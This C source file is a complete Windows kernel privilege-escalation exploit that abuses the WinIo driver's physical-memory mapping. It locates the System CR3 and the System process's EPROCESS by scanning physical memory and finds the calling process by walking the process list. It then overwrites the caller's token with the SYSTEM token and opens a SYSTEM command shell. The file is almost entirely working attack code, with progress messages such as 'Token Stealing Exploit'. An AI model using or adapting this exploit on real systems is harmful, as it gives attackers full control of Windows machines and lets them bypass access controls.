#include <windows.h>
#include <stdio.h>
#include <string.h>

#define PML4_INDEX(va) ((va >> 39) & 0x1FF)
#define PDPT_INDEX(va) ((va >> 30) & 0x1FF)
#define PD_INDEX(va) ((va >> 21) & 0x1FF)
#define PT_INDEX(va) ((va >> 12) & 0x1FF)

// Explicit Hardware Mask to strip lower flags AND upper software/NX bits
#define HARDWARE_PFN_MASK 0x000FFFFFFFFFF000ULL
#define PRESENT_BIT 0x0001

#define IOCTL_MAP_PHYSICAL 0x80102040
#define IOCTL_UMAP_PHYSICAL 0x80102044

// EPROCESS offsets
#define EPROCESS_TOKEN_OFFSET 0x4B8
#define EPROCESS_SIZE 0xa40
#define EPROCESS_DTB_OFFSET 0x028
#define EPROCESS_PID_OFFSET 0x440
#define EPROCESS_IMAGENAME_OFFSET 0x5a8
#define EPROCESS_ACTIVELINKS_OFFSET 0x448
#define EPROCESS_ALIGN 0x10

#define PAGE_MASK 0xFFFFFFFFFFFFF000ULL
#define PRESENT_BIT 0x0001

typedef struct tagPhysStruct
{
    DWORD64 dwPhysMemSizeInBytes;
    DWORD64 pvPhysAddress;
    DWORD64 PhysicalMemoryHandle;
    DWORD64 pvPhysMemMapped;
    DWORD64 pvPhysSection;
} tagPhysStruct;

HANDLE g_hDevice = INVALID_HANDLE_VALUE;

PVOID MapPhysical(DWORD64 physAddr, DWORD64 size, tagPhysStruct *outInfo)
{
    tagPhysStruct info = {0};
    info.dwPhysMemSizeInBytes = size;
    info.pvPhysAddress = physAddr;
    DWORD bytes = 0;
    if (!DeviceIoControl(g_hDevice, IOCTL_MAP_PHYSICAL, &info, sizeof(info), &info, sizeof(info), &bytes, NULL))
        return NULL;
    *outInfo = info;
    return (PVOID)info.pvPhysMemMapped;
}

void UnmapPhysical(tagPhysStruct *info)
{
    DWORD bytes = 0;
    DeviceIoControl(g_hDevice, IOCTL_UMAP_PHYSICAL, info, sizeof(*info), info, sizeof(*info), &bytes, NULL);
}

DWORD64 FindSystemCR3()
{
    DWORD64 pageSize = 0x1000;

    for (DWORD64 phys = 0x1000; phys < 0x10000000; phys += pageSize)
    {
        tagPhysStruct info = {0};
        PDWORD64 pml4Page = (PDWORD64)MapPhysical(phys, pageSize, &info);
        if (!pml4Page)
            continue;

        for (int i = 0; i < 512; i++)
        {
            DWORD64 entry = pml4Page[i];
            DWORD64 targetPfn = entry & 0x000FFFFFFFFFF000ULL;

            if ((entry & 1) && targetPfn == phys && i >= 256)
            {
                UnmapPhysical(&info);
                printf("[+] System CR3 found: 0x%llX\n", phys);
                return phys;
            }
        }

        UnmapPhysical(&info);
    }

    return 0;
}

// Read EPROCESS field from physical address
DWORD64 ReadPhysicalQWORD(DWORD64 physAddr)
{
    tagPhysStruct info = {0};
    DWORD64 page_base = physAddr & 0xFFFFFFFFFFFFF000ULL;
    DWORD64 offset = physAddr & 0xFFFULL;

    PUCHAR mapped = (PUCHAR)MapPhysical(page_base, 0x1000, &info);
    if (!mapped)
        return 0;

    DWORD64 value = *(DWORD64 *)(mapped + offset);
    UnmapPhysical(&info);

    return value;
}

// Read bytes from physical address
BOOL ReadPhysicalMemory(DWORD64 physAddr, PVOID buffer, SIZE_T size)
{
    PUCHAR dest = (PUCHAR)buffer;

    while (size > 0)
    {
        DWORD64 page_base = physAddr & 0xFFFFFFFFFFFFF000ULL;
        DWORD64 offset = physAddr & 0xFFFULL;
        DWORD64 bytes_to_read = min(size, 0x1000 - offset);

        tagPhysStruct info = {0};
        PUCHAR mapped = (PUCHAR)MapPhysical(page_base, 0x1000, &info);
        if (!mapped)
            return FALSE;

        memcpy(dest, mapped + offset, bytes_to_read);
        UnmapPhysical(&info);

        dest += bytes_to_read;
        physAddr += bytes_to_read;
        size -= bytes_to_read;
    }

    return TRUE;
}


DWORD64 TranslateVirtualToPhysical(DWORD64 virtualAddr, DWORD64 cr3_physical)
{
    tagPhysStruct info = {0};

    // --- 1. PML4 Table Walk ---
    // just ensuring the CR3 itself has flags stripped
    DWORD64 pml4_phys = cr3_physical & HARDWARE_PFN_MASK;
    PDWORD64 pml4 = (PDWORD64)MapPhysical(pml4_phys, 0x1000, &info);
    if (!pml4)
        return 0;

    DWORD64 pml4_entry = pml4[PML4_INDEX(virtualAddr)];
    UnmapPhysical(&info);

    if (!(pml4_entry & PRESENT_BIT))
        return 0;
    // Strip software flags and NX bit
    DWORD64 pdpt_phys = pml4_entry & HARDWARE_PFN_MASK;

    // --- 2. PDPT Table Walk ---
    PDWORD64 pdpt = (PDWORD64)MapPhysical(pdpt_phys, 0x1000, &info);
    if (!pdpt)
        return 0;

    DWORD64 pdpt_entry = pdpt[PDPT_INDEX(virtualAddr)];
    UnmapPhysical(&info);

    if (!(pdpt_entry & PRESENT_BIT))
        return 0;

    // Check for 1GB Large Page (Bit 7 - Page Size bit)
    if (pdpt_entry & 0x80)
    {
        return (pdpt_entry & 0xFFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFF);
    }
    // Strip software flags and NX bit
    DWORD64 pd_phys = pdpt_entry & HARDWARE_PFN_MASK;

    // --- 3. PD Table Walk ---
    PDWORD64 pd = (PDWORD64)MapPhysical(pd_phys, 0x1000, &info);
    if (!pd)
        return 0;

    DWORD64 pd_entry = pd[PD_INDEX(virtualAddr)];
    UnmapPhysical(&info);

    if (!(pd_entry & PRESENT_BIT))
        return 0;

    // Check for 2MB Large Page (Bit 7)
    if (pd_entry & 0x80)
    {
        return (pd_entry & 0xFFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFF);
    }
    // Strip software flags and NX bit
    DWORD64 pt_phys = pd_entry & HARDWARE_PFN_MASK;

    // --- 4. PT Table Walk ---
    PDWORD64 pt = (PDWORD64)MapPhysical(pt_phys, 0x1000, &info);
    if (!pt)
        return 0;

    DWORD64 pt_entry = pt[PT_INDEX(virtualAddr)];
    UnmapPhysical(&info);

    if (!(pt_entry & PRESENT_BIT))
        return 0;

    // --- 5. Final 4KB Page Assembly ---
    return (pt_entry & HARDWARE_PFN_MASK) + (virtualAddr & 0xFFF);
}

DWORD64 ScanForSystemEPROCESS(DWORD64 systemCR3)
{
    DWORD64 pageSize = 0x1000;
    DWORD64 maxAddr = 0x200000000ULL;
    DWORD64 safeLimit = pageSize - EPROCESS_SIZE; // 0xa40

    for (DWORD64 physAddr = 0x1000; physAddr < maxAddr; physAddr += pageSize)
    {
        tagPhysStruct info = {0};
        PUCHAR page = (PUCHAR)MapPhysical(physAddr, pageSize, &info);
        if (!page)
            continue;

        // Aligned scanning (8-byte steps, not byte-by-byte)
        for (DWORD64 offset = 0; offset <= safeLimit; offset += EPROCESS_ALIGN)
        {
            PUCHAR candidate = page + offset;

            // checking cr3 value
            DWORD64 dtb = (*(DWORD64 *)(candidate + EPROCESS_DTB_OFFSET)) & PAGE_MASK;
            if (dtb != systemCR3)
                continue;

            printf("[-] Found Directory Table Base value 0x%X at Physical Address 0x%X\n", dtb, physAddr + offset);
            
            
            DWORD64 pid = *(DWORD64 *)(candidate + EPROCESS_PID_OFFSET);
            if (pid != 4)
                continue;
            printf("\n\n[*] Found image name %s with PID %lld\n", candidate + EPROCESS_IMAGENAME_OFFSET, pid);
            // SLOW: String comparison (only after quick checks pass)
            if (memcmp(candidate + EPROCESS_IMAGENAME_OFFSET, "System", 6) == 0)
            {
                printf("==========================================================================\n");
                printf("[*] Found system EPROCESS at physical address: 0x%lX\n", physAddr + offset);
                printf("==========================================================================\n");
                UnmapPhysical(&info);
                return physAddr + offset;
            }
        }
        UnmapPhysical(&info);
    }
    return 0;
}
// Find EPROCESS by PID by walking the list
DWORD64 FindEPROCESSByPID(DWORD64 system_eprocess_phys, DWORD target_pid, DWORD64 systemCR3)
{
    printf("\n[*] Searching for EPROCESS with PID: %d\n", target_pid);

    DWORD64 current_eprocess_phys = system_eprocess_phys;
    DWORD64 visited = 0;

    while (visited < 512)
    {
        visited++;

        // Read PID from current EPROCESS
        DWORD64 pid = ReadPhysicalQWORD(current_eprocess_phys + EPROCESS_PID_OFFSET);

        char imageName[16] = {0};
        ReadPhysicalMemory(current_eprocess_phys + EPROCESS_IMAGENAME_OFFSET, imageName, 15);

        printf("[*] Checking PID: %lld | Image: %s\n", pid, imageName);

        // Found target process
        if (pid == target_pid)
        {
            printf("[+] Found target process EPROCESS at physical: 0x%llX\n", current_eprocess_phys);
            return current_eprocess_phys;
        }

        // Read next EPROCESS from ActiveProcessLinks
        DWORD64 next_link_virtual = ReadPhysicalQWORD(current_eprocess_phys + EPROCESS_ACTIVELINKS_OFFSET);
        if (!next_link_virtual)
            break;

        // Translate to physical
        DWORD64 next_link_physical = TranslateVirtualToPhysical(next_link_virtual, systemCR3);
        if (!next_link_physical)
            break;

        DWORD64 next_eprocess_phys = next_link_physical - EPROCESS_ACTIVELINKS_OFFSET;

        if (next_eprocess_phys == system_eprocess_phys)
        {
            printf("[-] Target PID not found in process list\n");
            break;
        }

        current_eprocess_phys = next_eprocess_phys;
    }

    return 0;
}

// Write to physical memory (requires physical write capability via WinIo)
BOOL WritePhysicalQWORD(DWORD64 physAddr, DWORD64 value)
{
    tagPhysStruct info = {0};
    DWORD64 page_base = physAddr & 0xFFFFFFFFFFFFF000ULL;
    DWORD64 offset = physAddr & 0xFFFULL;

    PUCHAR mapped = (PUCHAR)MapPhysical(page_base, 0x1000, &info);
    if (!mapped)
        return FALSE;

    *(DWORD64 *)(mapped + offset) = value;
    UnmapPhysical(&info);

    return TRUE;
}

// Token stealing: Copy System token and inject into current process
BOOL StealSystemToken(DWORD64 system_eprocess_phys, DWORD64 current_eprocess_phys)
{
    printf("\n[*] Token Stealing Exploit\n");
    printf("==========================================================================\n");

    // Read System process token
    DWORD64 system_token = ReadPhysicalQWORD(system_eprocess_phys + EPROCESS_TOKEN_OFFSET);
    printf("[+] System process token: 0x%llX\n", system_token);

    if (!system_token)
    {
        printf("[-] Failed to read System token\n");
        return FALSE;
    }

    // Read current process token (before replacement)
    DWORD64 current_token_old = ReadPhysicalQWORD(current_eprocess_phys + EPROCESS_TOKEN_OFFSET);
    printf("[+] Current process token (before): 0x%llX\n", current_token_old);

    // Write System token to current process
    printf("[*] Injecting System token into current process...\n");
    if (!WritePhysicalQWORD(current_eprocess_phys + EPROCESS_TOKEN_OFFSET, system_token))
    {
        printf("[-] Failed to write token\n");
        return FALSE;
    }

    // Verify token was written
    DWORD64 current_token_new = ReadPhysicalQWORD(current_eprocess_phys + EPROCESS_TOKEN_OFFSET);
    printf("[+] Current process token (after): 0x%llX\n", current_token_new);

    if (current_token_new == system_token)
    {
        printf("[+] Token injection successful!\n");
        printf("==========================================================================\n");
        return TRUE;
    }
    else
    {
        printf("[-] Token injection failed - verification mismatch\n");
        return FALSE;
    }
}

// Spawn cmd.exe and run as current process (now elevated to SYSTEM)
void SpawnElevatedCMD()
{
    printf("\n[*] Spawning elevated CMD...\n");
    printf("==========================================================================\n");

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    // Create cmd.exe process
    if (CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("[+] CMD process spawned with PID: %ld\n", pi.dwProcessId);
        printf("[+] Type 'whoami' to verify NT AUTHORITY\\SYSTEM\n");
        printf("[+] Type 'exit' to close\n");
        printf("==========================================================================\n");

        // Wait for cmd to close
        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        printf("[-] Failed to spawn CMD: %d\n", GetLastError());
    }
}

// Verify current process privileges
BOOL VerifySystemPrivileges()
{
    printf("\n[*] Verifying privileges...\n");

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        printf("[-] Failed to open token\n");
        return FALSE;
    }

    TOKEN_USER *pTokenUser = NULL;
    DWORD dwSize = 0;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    pTokenUser = (TOKEN_USER *)malloc(dwSize);

    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
    {
        WCHAR szName[256], szDomain[256];
        DWORD dwNameSize = 256, dwDomainSize = 256;
        SID_NAME_USE eUse;

        if (LookupAccountSidW(NULL, pTokenUser->User.Sid, szName, &dwNameSize,
                              szDomain, &dwDomainSize, &eUse))
        {
            printf("[+] Current user: %S\\%S\n", szDomain, szName);

            if (wcscmp(szDomain, L"NT AUTHORITY") == 0 && wcscmp(szName, L"SYSTEM") == 0)
            {
                printf("[+] SUCCESS! Running as SYSTEM\n");
                free(pTokenUser);
                CloseHandle(hToken);
                return TRUE;
            }
        }
    }

    free(pTokenUser);
    CloseHandle(hToken);
    return FALSE;
}


int main()
{
    g_hDevice = CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open device: %d\n", GetLastError());
        return 1;
    }

    DWORD64 systemCR3 = FindSystemCR3();
    if (!systemCR3)
    {
        printf("[-] Failed to find System CR3\n");
        CloseHandle(g_hDevice);
        return 1;
    }

    printf("[+] Scanning for System EPROCESS...\n");

    DWORD64 pageSize = 0x1000;
    DWORD64 maxAddr = 0x200000000ULL;
    DWORD64 foundAddr = 0;
    DWORD64 safeLimit = pageSize - 0x600;

    DWORD64 system_eprocess = ScanForSystemEPROCESS(systemCR3);
    if (system_eprocess)
    {
        // Get current process PID
        DWORD current_pid = GetCurrentProcessId();
        printf("\n[*] Current process PID: %d\n", current_pid);

        // Find current process EPROCESS
        DWORD64 current_eprocess = FindEPROCESSByPID(system_eprocess, current_pid, systemCR3);
        if (current_eprocess)
        {
            // Steal System token and inject
            if (StealSystemToken(system_eprocess, current_eprocess))
            {
                // Verify privileges
                if (VerifySystemPrivileges())
                {
                    // Spawn elevated CMD
                    SpawnElevatedCMD();
                } else {
                    printf("[x] Exploit failed :( \n");
                }
            }
        }
    }

    CloseHandle(g_hDevice);
    return 0;
    // printf("Physical Address: 0x%llX\n", TranslateVirtualToPhysical(0xFFFFDA0A2B4C0080, systemCR3));

    CloseHandle(g_hDevice);
    return 0;
}